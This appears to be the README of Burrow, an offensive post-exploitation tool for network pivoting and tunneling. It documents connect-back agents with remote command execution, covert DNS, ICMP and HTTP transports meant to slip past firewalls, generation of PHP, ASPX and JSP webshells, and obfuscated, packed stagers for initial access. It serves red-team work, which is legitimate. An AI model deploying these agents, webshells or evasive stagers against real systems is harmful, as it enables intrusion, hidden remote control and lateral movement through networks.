# Burrow

Multi-transport network pivoting and tunneling tool for post-exploitation network traversal. Static Go binary, zero dependencies.

## Overview

Burrow provides a pluggable transport architecture where any tunnel type (SOCKS5, port forward, relay, pivot chain) runs over any transport (Raw TCP/TLS, WebSocket, DNS, ICMP, HTTP). The agent/server model uses multiplexed yamux sessions over a single control channel, carrying multiple concurrent tunnels and control messages simultaneously.

- **Transports**: Raw TCP/TLS, WebSocket, DNS tunnel, ICMP tunnel, HTTP tunnel
- **Encryption**: X25519 key exchange, HKDF-SHA256 derivation, ChaCha20-Poly1305 AEAD per frame
- **TLS**: Auto-generated Ed25519 certificates with SHA256 fingerprint verification
- **Routing**: TUN interface (root, gvisor userspace netstack) or SOCKS5 proxy (non-root)
- **Management**: Interactive TUI, WebUI dashboard, REST API, Python MCP server
- **Stager**: Minimal agent binary for initial access (no TUI/TUN/SOCKS5)

## Install

Requires Go 1.24+.

```bash
# Current platform
make build-local          # -> build/burrow

# All platforms (linux/windows/darwin, amd64+arm64)
make build                # -> build/burrow-<os>-<arch>[.exe]

# Everything: all platforms + stager + evasion + packed
make build-all
```

Pre-compiled binaries are in [`build/`](build/).

## Release Binaries

### Burrow (full agent/server)

| Binary | Platform | Arch |
|--------|----------|------|
| `burrow-linux-amd64` | Linux | x86_64 |
| `burrow-linux-arm64` | Linux | ARM64 |
| `burrow-windows-amd64.exe` | Windows | x86_64 |
| `burrow-darwin-amd64` | macOS | Intel |
| `burrow-darwin-arm64` | macOS | Apple Silicon |

### Stager (minimal agent)

| Binary | Description |
|--------|-------------|
| `stager-linux-amd64` | Standard stager, Linux x86_64 |
| `stager-windows-amd64.exe` | Standard stager, Windows x86_64 |
| `stager-evasion-linux-amd64` | Obfuscated strings, Linux x86_64 |
| `stager-evasion-windows-amd64.exe` | Obfuscated strings, Windows x86_64 |
| `stager-packed-linux-amd64` | Obfuscated + packed, Linux x86_64 |
| `stager-packed-windows-amd64.exe` | Obfuscated + packed, Windows x86_64 |

## Transports

Both sides must use the same transport (`--transport <name>`).

| Transport | Flag | Description | Use Case |
|-----------|------|-------------|----------|
| Raw TCP/TLS | `raw` (default) | Direct TCP with auto-generated TLS | Default. Fast, reliable. |
| WebSocket | `ws` | HTTP/HTTPS upgrade | Firewall evasion, looks like HTTPS |
| DNS | `dns` | DNS query/response encoding | Only DNS egress allowed |
| ICMP | `icmp` | ICMP echo payloads | Only ping allowed. Requires raw socket. |
| HTTP | `http` | HTTP request/response polling | Only HTTP/HTTPS egress. Works through proxies/WAFs. |

## Quick Start

### Server + Agent

```bash
# Terminal 1: Start server
burrow server --tui --webui

# Terminal 2: Connect agent (copy fingerprint from server output)
burrow agent --connect <server>:11601 --fp <fingerprint>
```

### TUI Controls

| Key | Action |
|-----|--------|
| `Enter` | Session detail view |
| `Ctrl+T` | Add tunnel |
| `r` | Add route |
| `t` | Toggle TUN |
| `s` | Toggle SOCKS5 |
| `x` | Execute command |
| `u` / `n` | Start / stop tunnel |
| `d` | Delete tunnel/route |
| `w` / `p` | Download / upload file |
| `?` | Help overlay |

## Commands

### `burrow server`

Start the proxy server.

| Flag | Default | Description |
|------|---------|-------------|
| `--listen, -l` | `0.0.0.0:11601` | Listen address |
| `--transport, -t` | `raw` | Transport: `raw`, `ws`, `dns`, `icmp`, `http` |
| `--cert` / `--key` | | Custom TLS certificate/key PEM |
| `--no-tls` | | Disable TLS |
| `--tui` | | Interactive TUI dashboard |
| `--webui` | `0.0.0.0:9090` | WebUI dashboard |
| `--mcp-api` | | REST API for MCP integration |
| `--api-token` | | API auth token (auto-generated if empty) |
| `--log-file` | | Log to file |

```bash
burrow server                                          # Raw TCP, auto-TLS
burrow server --tui --webui                            # TUI + WebUI
burrow server --transport ws --listen 0.0.0.0:443      # WebSocket
burrow server --transport dns --listen 0.0.0.0:53      # DNS tunnel
burrow server --transport icmp                         # ICMP tunnel
burrow server --transport http --listen 0.0.0.0:8080   # HTTP tunnel
```

### `burrow agent`

Connect back to a server. Auto-reconnects on disconnect.

| Flag | Default | Description |
|------|---------|-------------|
| `--connect, -c` | (required) | Server address (`host:port`) |
| `--fp, -f` | | Server TLS fingerprint (SHA256, prefix match supported) |
| `--transport, -t` | `raw` | Transport (must match server) |
| `--retry` | `0` | Max reconnect attempts (`0` = infinite) |
| `--no-tls` | | Connect without TLS |

```bash
burrow agent -c 10.0.0.1:11601 --fp AB:CD:EF:01
burrow agent -c 10.0.0.1:443 --transport ws
burrow agent -c 10.0.0.1:53 --transport dns
```

### `burrow session`

Manage sessions via CLI (requires `--mcp-api` or `--webui` on server).

```bash
burrow session list --token <token>
burrow session list --token <token> --json
burrow session info <id> --token <token>
burrow session use <id> --token <token>       # Interactive REPL
```

**REPL commands:**

| Command | Description |
|---------|-------------|
| `info` | Session details |
| `tunnels` / `routes` | List tunnels/routes |
| `tunnel add <dir> <listen> <remote> [proto]` | Create tunnel (`local`/`remote`/`reverse`) |
| `tunnel rm <id>` | Remove tunnel |
| `route add <cidr>` | Add route |
| `route rm <cidr>` | Remove route |
| `tun start` / `tun stop` | TUN interface (root) |
| `socks5 start` / `socks5 stop` | SOCKS5 proxy |
| `exec <command>` | Execute command on agent |
| `download <path>` / `upload <local> <remote>` | File transfer |

### `burrow proxy socks5`

Standalone SOCKS5 proxy (RFC 1928).

```bash
burrow proxy socks5                                     # 127.0.0.1:1080
burrow proxy socks5 -l 0.0.0.0:9050 --auth user:pass
```

### `burrow proxy http`

HTTP forward proxy with CONNECT support.

```bash
burrow proxy http                                       # 127.0.0.1:8080
burrow proxy http -l 0.0.0.0:3128 --auth user:pass
```

### `burrow tunnel local`

Local port forward (like `ssh -L`).

```bash
burrow tunnel local -l 127.0.0.1:8080 -r 10.0.0.5:80
```

### `burrow tunnel reverse`

Reverse port forward (like `ssh -R`).

```bash
burrow tunnel reverse -l 0.0.0.0:2222 -r 10.0.0.5:22
```

### `burrow relay`

Bidirectional TCP relay between two addresses.

```bash
burrow relay -l 0.0.0.0:8080 -r 10.0.0.5:80
```

### `burrow pivot`

Multi-hop pivot chain through intermediate hosts.

```bash
burrow pivot --chain "10.0.0.5:11601,172.16.0.1:11601" --listen 127.0.0.1:1080
```

### `burrow httptunnel`

reGeorg-style HTTP tunnel for egress-blocked networks.

```bash
# Target (no outbound needed):
burrow httptunnel server -l 0.0.0.0:8080 -k <key>

# Attacker:
burrow httptunnel client -c http://target:8080/b -k <key> -l 127.0.0.1:1080

# Route tools through SOCKS5:
proxychains nmap -sT -Pn 10.0.0.0/24
```

### `burrow generate webshell`

Generate HTTP tunnel webshells (PHP, ASPX, JSP) implementing the same protocol.

```bash
burrow generate webshell --format php --key <key> -o tunnel.php
burrow generate webshell --format aspx --key <key> -o tunnel.aspx
burrow generate webshell --format jsp --key <key> -o tunnel.jsp
```

### `burrow discover`

Network discovery via ping sweep and port scan.

```bash
burrow discover --target 10.0.0.0/24 --ports 22,80,443,3389,445
```

## TUN Mode (Transparent Pivoting)

TUN mode creates a virtual network interface for full IP-level routing. Any protocol (TCP, UDP, ICMP) routes transparently through the agent without proxy configuration.

The agent uses gvisor's userspace netstack (no root needed on agent). Only the operator needs root to create the TUN interface.

```bash
# Start server as root
sudo burrow server --tui --webui

# After agent connects:
# TUI: press 't' to enable TUN, 'r' to add route
# CLI:
burrow session use <id>
burrow> tun start
burrow> route add 10.10.10.0/24

# All tools work transparently:
nmap -sT -Pn 10.10.10.0/24
ssh user@10.10.10.25
curl http://10.10.10.15/
```

Routes must be added manually to prevent routing loops. Never route the C2 subnet through TUN.

## Stager

The stager is a minimal agent binary for initial access. No TUI, TUN, or SOCKS5 — connect-back and command relay only.

### Build

```bash
make build-stager            # Standard (linux + windows)
make build-stager-evasion    # Obfuscated strings (requires anvil)
make build-stager-packed     # Obfuscated + packed
```

### Embed Defaults

Compile with embedded server address, fingerprint, and options:

```bash
CGO_ENABLED=0 go build -ldflags="-s -w \
  -X main.defaultServer=<server>:<port> \
  -X main.defaultFingerprint=<fingerprint> \
  -X main.defaultNoTLS=false \
  -X main.defaultMasq=true" \
  -o stager ./cmd/stager/
```

## Project Structure

```
cmd/burrow/cmd/          CLI + TUI (Cobra, Bubbletea)
cmd/stager/              Minimal agent for initial access
internal/
  certgen/               TLS certificate generation (Ed25519)
  crypto/                X25519, HKDF-SHA256, AEAD encryption
  discovery/             Network discovery (ping sweep, port scan)
  httptunnel/            HTTP tunnel transport + webshell generator
  mux/                   yamux session multiplexing
  netstack/              gvisor userspace TCP/IP stack (TUN)
  pivot/                 Multi-hop pivot chain
  protocol/              Wire protocol (framing, messages)
  proxy/                 SOCKS5 + HTTP forward proxy
  relay/                 Bidirectional TCP relay
  session/               Session lifecycle management
  transport/             Pluggable transport layer
    raw/                 Raw TCP/TLS
    ws/                  WebSocket
    dns/                 DNS tunnel
    icmp/                ICMP tunnel
    http/                HTTP polling tunnel
  tun/                   TUN interface management
  tunnel/                Tunnel orchestration
  udp/                   UDP handling
  web/                   WebUI + REST API
src/                     Python MCP server module
tools/                   Build utilities (string obfuscation, packer)
```

## Build Targets

| Target | Description |
|--------|-------------|
| `make build-local` | Current platform |
| `make build` | All 5 platforms |
| `make build-<os>-<arch>` | Single platform (e.g., `build-linux-arm64`) |
| `make build-stager` | Stager (linux + windows) |
| `make build-stager-evasion` | Obfuscated stager (requires anvil) |
| `make build-stager-packed` | Obfuscated + packed stager |
| `make build-all` | Everything (11 binaries) |
| `make test` | Run all tests |
| `make verify` | Verify all binaries exist |
| `make sizes` | Print binary sizes |
| `make clean` | Remove build directory |

## v3.0.0 Release Notes

### Core
- Pluggable transport architecture: Raw TCP/TLS, WebSocket, DNS, ICMP, HTTP
- Multiplexed yamux sessions over single control channel
- X25519/HKDF-SHA256/ChaCha20-Poly1305 end-to-end encryption
- TLS with Ed25519 auto-generated certificates and fingerprint verification
- Short fingerprint prefix matching (8+ bytes)

### Agent/Server
- Agent auto-reconnect with exponential backoff
- Remote command execution
- Bidirectional file transfer (download/upload)
- Session kill API
- SOCKS5 session routing

### Tunneling
- Local, remote, and reverse port forwarding
- TUN transparent pivoting (gvisor userspace netstack)
- SOCKS5 and HTTP forward proxies with auth
- Multi-hop pivot chains
- HTTP tunnel (reGeorg-style) with webshell generation (PHP/ASPX/JSP)
- Bidirectional TCP relay

### Interface
- Interactive TUI (Bubbletea) with session management, tunnel controls, help overlay
- WebUI dashboard
- REST API for programmatic access
- Python MCP server module
- CLI JSON output mode

### Stager
- Minimal initial-access agent
- Compile-time embedded config (server, fingerprint, masquerade)
- String obfuscation via anvil toolkit
- Custom packing for reduced binary size

## License

This project is licensed under the [GNU Affero General Public License v3.0](LICENSE).
